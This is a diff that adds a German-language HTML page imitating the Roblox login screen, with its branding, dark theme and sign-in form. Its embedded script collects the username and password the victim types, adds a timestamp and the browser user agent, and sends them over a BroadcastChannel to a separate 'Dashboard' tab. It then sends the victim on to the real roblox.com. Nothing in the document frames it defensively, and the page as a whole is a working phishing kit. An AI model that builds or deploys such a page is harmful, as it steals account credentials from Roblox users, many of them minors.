@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Bei Roblox anmelden</title>
+    <style>
+        /* Variables basierend auf dem Roblox Dark Theme */
+        :root {
+            --color-common-backdrop: #191b1f;
+            --color-card-bg: #232527;
+            --color-input-bg: #111111;
+            --color-input-border: #393b3d;
+            --color-btn-primary: #00b06f;
+            --color-btn-primary-hover: #009960;
+            --color-btn-secondary: #393b3d;
+            --color-text: #ffffff;
+            --font-stack: 'Gotham', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: var(--font-stack);
+            background-color: var(--color-common-backdrop);
+            color: var(--color-text);
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Navigation Bar */
+        .navbar-fixed-top {
+            background-color: #191b1f;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            height: 60px;
+            z-index: 1000;
+            box-sizing: border-box;
+            border-bottom: 1px solid #2a2d31;
+        }
+
+        .navbar-brand {
+            color: white;
+            font-size: 24px;
+            font-weight: 700;
+            text-decoration: none;
+            letter-spacing: 1px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 25px;
+        }
+
+        .nav-links a {
+            color: #e3e3e3;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            transition: color 0.2s;
+        }
+
+        .nav-links a:hover {
+            color: #fff;
+        }
+
+        /* Login Container */
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding-top: 80px; /* Space for fixed header */
+            background-color: var(--color-common-backdrop);
+        }
+
+        .login-base-container {
+            background-color: var(--color-card-bg);
+            padding: 40px 30px;
+            border-radius: 8px;
+            width: 360px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: center;
+            border: 1px solid var(--color-input-border);
+        }
+
+        .login-header {
+            font-size: 26px;
+            margin-bottom: 25px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--color-input-border);
+            border-radius: 6px;
+            background-color: var(--color-input-bg);
+            color: white;
+            font-size: 15px;
+            box-sizing: border-box;
+            transition: all 0.2s ease;
+        }
+
+        .form-control::placeholder {
+            color: #888;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--color-btn-primary);
+            box-shadow: 0 0 0 2px rgba(0, 176, 111, 0.2);
+        }
+
+        /* Buttons */
+        .btn-secondary-md {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--color-btn-primary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+
+        .btn-secondary-md:hover {
+            background-color: var(--color-btn-primary-hover);
+        }
+
+        .text-link {
+            color: #ccc;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 15px;
+            display: block;
+            transition: color 0.2s;
+        }
+
+        .text-link:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+
+        .alternative-login-divider-container {
+            margin: 25px 0;
+            border-bottom: 1px solid var(--color-input-border);
+            position: relative;
+        }
+
+        .btn-control-md {
+            width: 100%;
+            padding: 12px;
+            background-color: transparent;
+            color: #e3e3e3;
+            border: 1px solid var(--color-input-border);
+            border-radius: 6px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+
+        .btn-control-md:hover {
+            background-color: var(--color-btn-secondary);
+            border-color: #555;
+        }
+
+        .register-link {
+            color: var(--color-btn-primary);
+            font-weight: 700;
+        }
+    </style>
+</head>
+<body class="bg-common-backdrop">
+
+    <!-- Header Navigation -->
+    <div class="navbar-fixed-top">
+        <a href="#" class="navbar-brand">Roblox</a>
+        <div class="nav-links">
+            <a href="#">Charts</a>
+            <a href="#">Marktplatz</a>
+            <a href="#">Erstellen</a>
+            <a href="#">Robux</a>
+        </div>
+    </div>
+
+    <!-- Login Form -->
+    <div class="login-container">
+        <div class="login-base-container">
+            <h1 class="login-header">Konto hinzufügen</h1>
+            <form class="login-form" id="robloxLoginForm">
+                <div class="form-group">
+                    <input type="text" id="username" class="form-control" placeholder="Benutzer/E-Mail/Telefon" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" class="form-control" placeholder="Passwort" required>
+                </div>
+                <button type="submit" class="btn-secondary-md">Anmelden</button>
+            </form>
+            <a href="#" class="text-link">Passwort oder Benutzername vergessen?</a>
+            
+            <div class="alternative-login-divider-container"></div>
+            
+            <button class="btn-control-md">Einmaligen Code per E-Mail senden</button>
+            <button class="btn-control-md">Schnellanmeldung</button>
+
+            <div style="margin-top: 25px;">
+                <span style="font-size: 14px; color: #ccc;">Du hast kein Konto?</span>
+                <a href="#" class="text-link register-link">Registrieren</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Webhook Script -->
+    <script>
+        document.getElementById('robloxLoginForm').addEventListener('submit', function(event) {
+            // Prevent default form submission
+            event.preventDefault();
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            if (!username || !password) {
+                alert("Bitte Benutzername und Passwort eingeben.");
+                return;
+            }
+
+            // Create data object
+            var data = {
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString(),
+                ip_address: "Unknown (Client Side)",
+                user_agent: navigator.userAgent
+            };
+
+            // Send data via BroadcastChannel to the Dashboard tab
+            // This requires the Dashboard tab to be open in the same browser
+            if (typeof BroadcastChannel !== 'undefined') {
+                const channel = new BroadcastChannel('roblox_login_channel');
+                channel.postMessage(data);
+                console.log("Daten an Dashboard gesendet!");
+                channel.close();
+            } else {
+                console.error("BroadcastChannel nicht unterstützt.");
+            }
+
+            // Optional: Show a small message
+            alert("Anmeldedaten erfolgreich übermittelt. Weiterleitung...");
+            
+            // Optional: Redirect after a delay
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com";
+            }, 1500);
+        });
+    </script>
+
+</body>
+</html>
